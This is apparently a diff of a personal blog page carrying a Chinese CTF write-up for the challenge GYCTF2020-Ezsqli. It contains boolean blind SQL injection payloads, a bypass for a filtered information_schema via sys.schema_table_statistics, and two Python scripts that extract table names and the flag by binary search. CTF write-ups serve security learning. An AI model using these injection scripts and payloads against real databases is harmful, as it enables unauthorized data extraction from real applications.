@@ -6,17 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2022 | P1nk Blog</title>
+  <title>GYCTF2020-Ezsqli | P1nk Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="p1nk blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="P1nk Blog">
-<meta property="og:url" content="http://example.com/archives/2022/index.html">
+  <meta name="description" content="知识点  布尔盲注 无列名注入  1.抓包，测试发现 123id&#x3D;1时显示Nu1Lid&#x3D;0时显示Error Occured When Fetch Result.id&#x3D;&amp;#x27;时显示bool(false)  由此推断这里存在数字型的bool注入，构造测试语句">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020-Ezsqli">
+<meta property="og:url" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/index.html">
 <meta property="og:site_name" content="P1nk Blog">
-<meta property="og:description" content="p1nk blog">
+<meta property="og:description" content="知识点  布尔盲注 无列名注入  1.抓包，测试发现 123id&#x3D;1时显示Nu1Lid&#x3D;0时显示Error Occured When Fetch Result.id&#x3D;&amp;#x27;时显示bool(false)  由此推断这里存在数字型的bool注入，构造测试语句">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/1.png">
+<meta property="og:image" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/2.png">
+<meta property="og:image" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/3.png">
+<meta property="og:image" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/4.png">
+<meta property="article:published_time" content="2022-03-12T02:58:56.000Z">
+<meta property="article:modified_time" content="2022-03-12T06:24:44.766Z">
 <meta property="article:author" content="p1nk">
+<meta property="article:tag" content="buuctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/12/GYCTF2020-Ezsqli/1.png">
   
     <link rel="alternative" href="/atom.xml" title="P1nk Blog" type="application/atom+xml">
   
@@ -158,36 +166,88 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-GYCTF2020-Ezsqli" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/12/GYCTF2020-Ezsqli/" class="archive-article-date">
-  	<time datetime="2022-03-12T02:58:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/12/GYCTF2020-Ezsqli/">GYCTF2020-Ezsqli</a>
+    <h1 class="article-title" itemprop="name">
+      GYCTF2020-Ezsqli
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/03/12/GYCTF2020-Ezsqli/" class="archive-article-date">
+  	<time datetime="2022-03-12T02:58:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>知识点</strong></p>
+<ul>
+<li>布尔盲注</li>
+<li>无列名注入</li>
+</ul>
+<p>1.抓包，测试发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1时显示Nu1L</span><br><span class="line">id=0时显示Error Occured When Fetch Result.</span><br><span class="line">id=&#x27;时显示bool(false)</span><br></pre></td></tr></table></figure>
+
+<p>由此推断这里存在数字型的bool注入，构造测试语句</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;80)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/12/GYCTF2020-Ezsqli/1.png" alt="1"></p>
+<p>检测到存在sql注入，经过我的一番尝试，发现information_schema被过滤了</p>
+<p>查看wp提示，这里可以使用<strong>sys.schema_table_statistics</strong>代替information。</p>
+<p>接下来就可以正常注入了，上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://ba50825e-faeb-46d1-88a4-3cfb66ef7483.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            paylaod = <span class="string">&quot;0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;paylod:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(paylaod))</span><br><span class="line">            data = &#123;<span class="string">&quot;id&quot;</span>: paylaod&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line">            mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">flag = func()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>我在脚本中加了一个sleep函数，防止请求过快，导致获取的数据不准确，运行结果如下：</p>
+<p><img src="/2022/03/12/GYCTF2020-Ezsqli/2.png" alt="2"></p>
+<p>得到表名之后，由于不能使用information_schema，所以这里要用到无列名注入。</p>
+<p>所谓无列名注入，我的理解就是，通过取别名获取字段里的数据，<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">详细讲解请参考</a></p>
+<p>经过测试得到该表有两列，<code>0^((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></p>
+<p><img src="/2022/03/12/GYCTF2020-Ezsqli/3.png" alt="3"></p>
+<p>利用脚本获取flag，我使用的脚本是二分法搜索，比遍历快一点，这个脚本的关键是判断while循环的出口。注意：在比较字符的时候，mysql默认只比较前面的字符串，比如<code>0^((1,&#39;a&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>，这里面就只默认用字符a和后面的第一个字符比较，如果’a’换成’ab’，那么用字符串’ab’和后面的前两个字符进行比较</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符转为16进制</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    h = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        h += <span class="built_in">hex</span>(<span class="built_in">ord</span>(s)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    h = <span class="string">&#x27;0x&#x27;</span> + h</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    url = <span class="string">&quot;http://ba50825e-faeb-46d1-88a4-3cfb66ef7483.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) &gt;&gt; <span class="number">1</span> <span class="comment"># 右移运算</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:   <span class="comment"># 使用二分搜索法</span></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)    <span class="comment">#防止请求频率过高而导致回显不准确</span></span><br><span class="line">            flag = s + <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="comment"># print(flag)</span></span><br><span class="line">            payload = <span class="string">&quot;0^((1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str2hex(flag))</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(mid)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> s</span><br><span class="line">        s += <span class="built_in">chr</span>(mid - <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">flag = func()</span><br><span class="line"><span class="built_in">print</span>(flag.lower()) <span class="comment"># 转换成小写输出</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本得到flag</p>
+<p><img src="/2022/03/12/GYCTF2020-Ezsqli/4.png" alt="4"></p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43952190/article/details/107588486">https://blog.csdn.net/weixin_43952190/article/details/107588486</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -199,19 +259,96 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/12/GYCTF2020-Ezsqli/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
+
   
 
-    
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
+  
+
+  
+
+  
+
+  
 
 
           </div>
@@ -239,8 +376,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
